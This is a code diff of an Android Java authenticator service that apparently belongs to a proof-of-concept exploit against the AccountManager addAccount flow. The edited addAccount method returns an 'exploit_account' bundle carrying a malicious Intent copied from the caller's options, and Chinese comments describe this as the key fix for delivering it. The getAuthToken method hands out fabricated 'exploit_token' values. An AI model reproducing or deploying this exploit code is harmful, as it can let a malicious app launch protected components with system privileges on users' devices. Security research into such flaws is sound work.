@@ -10,16 +10,22 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.IBinder;
+import android.util.Log;
 
-/**
- * Authenticator returning {@link #addAccountResponse} when addAccount operation is requested
- *
- * See {@link MainActivity} for usage of this service and {@link Ambiguator} for main PoC part
- */
 public class AuthService extends Service {
 
-    public static Bundle addAccountResponse;
-    public static boolean isBadResolve = false;
+    private static final String TAG = "AuthService";
+    private static Bundle addAccountResponse;
+    private static volatile boolean isBadResolve = false;
+
+    public static void setAddAccountResponse(Bundle response) {
+        addAccountResponse = response;
+    }
+    
+    public static void enableBadResolveMode(boolean enable) {
+        isBadResolve = enable;
+        Log.d(TAG, "BadResolve mode: " + enable);
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -27,23 +33,50 @@ public class AuthService extends Service {
     }
 
     private static class Authenticator extends AbstractAccountAuthenticator {
-        @Override
-        public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
-        	if(isBadResolve){
-        		isBadResolve = false;
-        		Bundle result = new Bundle();
-	            result.putString(AccountManager.KEY_ACCOUNT_NAME, "exploit_account");
-	            result.putString(AccountManager.KEY_ACCOUNT_TYPE, accountType);
-	            result.putParcelable(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);
-	            return result;
-        	}
-            return addAccountResponse;
-        }
-
-        // NOTHING INTERESTING BELOW
-
+        
         Authenticator(Context context) {
             super(context);
+        }
+
+        @Override
+        public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, 
+                                 String authTokenType, String[] requiredFeatures, Bundle options) 
+                                 throws NetworkErrorException {
+            
+            Log.d(TAG, "addAccount called, isBadResolve=" + isBadResolve);
+            
+            if (isBadResolve) {
+                // 关键修复：返回包含恶意Intent的Bundle
+                Bundle result = new Bundle();
+                result.putString(AccountManager.KEY_ACCOUNT_NAME, "exploit_account");
+                result.putString(AccountManager.KEY_ACCOUNT_TYPE, accountType);
+                result.putParcelable(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);
+                
+                // 从options中获取并传递恶意Intent
+                Intent exploitIntent = null;
+                if (options != null) {
+                    exploitIntent = options.getParcelable(AccountManager.KEY_INTENT);
+                    if (exploitIntent != null) {
+                        result.putParcelable(AccountManager.KEY_INTENT, exploitIntent);
+                        Log.d(TAG, "Added exploit intent to result: " + exploitIntent);
+                    }
+                }
+                
+                // 重置标志，避免重复触发
+                isBadResolve = false;
+                return result;
+            }
+            
+            // 正常模式
+            if (addAccountResponse != null) {
+                return addAccountResponse;
+            }
+            
+            // 默认响应
+            Bundle defaultResult = new Bundle();
+            defaultResult.putString(AccountManager.KEY_ACCOUNT_NAME, "default_account");
+            defaultResult.putString(AccountManager.KEY_ACCOUNT_TYPE, accountType);
+            return defaultResult;
         }
 
         @Override
@@ -52,12 +85,14 @@ public class AuthService extends Service {
         }
 
         @Override
-        public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) throws NetworkErrorException {
+        public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, 
+                                         Bundle options) throws NetworkErrorException {
             return null;
         }
 
         @Override
-        public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
+        public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, 
+                                   String authTokenType, Bundle options) throws NetworkErrorException {
             Bundle result = new Bundle();
             result.putString(AccountManager.KEY_AUTHTOKEN, "exploit_token_" + System.currentTimeMillis());
             result.putString(AccountManager.KEY_ACCOUNT_NAME, account.name);
@@ -71,12 +106,14 @@ public class AuthService extends Service {
         }
 
         @Override
-        public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
+        public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, 
+                                        String authTokenType, Bundle options) throws NetworkErrorException {
             return null;
         }
 
         @Override
-        public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) throws NetworkErrorException {
+        public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, 
+                                  String[] features) throws NetworkErrorException {
             Bundle result = new Bundle();
             result.putBoolean(AccountManager.KEY_BOOLEAN_RESULT, false);
             return result;
